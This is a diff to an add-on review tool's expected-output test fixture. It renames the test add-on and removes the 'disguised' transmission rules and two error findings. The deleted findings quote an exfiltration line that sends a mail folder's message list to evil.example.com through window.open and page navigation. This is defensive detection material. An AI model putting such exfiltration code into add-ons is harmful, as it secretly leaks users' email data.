@@ -1,9 +1,9 @@
 {
   "meta": {
     "action": "review",
-    "xpi": "<root>/tests/addons/disguised-exfil",
+    "xpi": "<root>/tests/addons/exfil-url-channels",
     "xpiRoot": "<work>/xpi/",
-    "xpiFile": "disguised-exfil",
+    "xpiFile": "exfil-url-channels",
     "reviewed": true,
     "schemaSource": "cache:release-mv3",
     "schemaBranch": "release-mv3",
@@ -66,10 +66,6 @@
       "multiple-vendor-files",
       "vendor-unparseable",
       "vendor-ambiguous-source",
-      "disguised-resource",
-      "disguised-stylesheet",
-      "disguised-window",
-      "disguised-navigation",
       "cleartext-transmission",
       "privacy-policy",
       "native-messaging",
@@ -93,47 +89,16 @@
       "vendored-remote-resources",
       "remote-eval",
       "data-exfiltration",
-      "disguised-transmission",
       "unacceptable-package-content",
       "shipped-icon-trademark-imitation"
     ]
   },
   "summary": {
-    "error": 2,
+    "error": 0,
     "hold": 0,
     "warning": 0,
     "info": 0,
-    "byRule": {
-      "disguised-window": 1,
-      "disguised-navigation": 1
-    }
+    "byRule": {}
   },
-  "findings": [
-    {
-      "ruleId": "disguised-window",
-      "severity": "error",
-      "file": "background.js",
-      "loc": {
-        "line": 8,
-        "column": 0
-      },
-      "item": null,
-      "hint": "disguised data send (window-open) \"https://evil.example.com/?d=\" + messenger.messages.list(folderId)",
-      "artifact": "XPI",
-      "message": "This add-on appears to send data through a window.open() to a remote URL - a channel not meant for data transmission. Disguising transmission this way is not allowed, even with the user’s consent. Use a normal request and disclose what is sent."
-    },
-    {
-      "ruleId": "disguised-navigation",
-      "severity": "error",
-      "file": "background.js",
-      "loc": {
-        "line": 12,
-        "column": 0
-      },
-      "item": null,
-      "hint": "disguised data send (navigation) \"https://evil.example.com/?d=\" + messenger.messages.list(folderId)",
-      "artifact": "XPI",
-      "message": "This add-on appears to send data through a page navigation - a channel not meant for data transmission. Disguising transmission this way is not allowed, even with the user’s consent. Use a normal request and disclose what is sent."
-    }
-  ]
+  "findings": []
 }
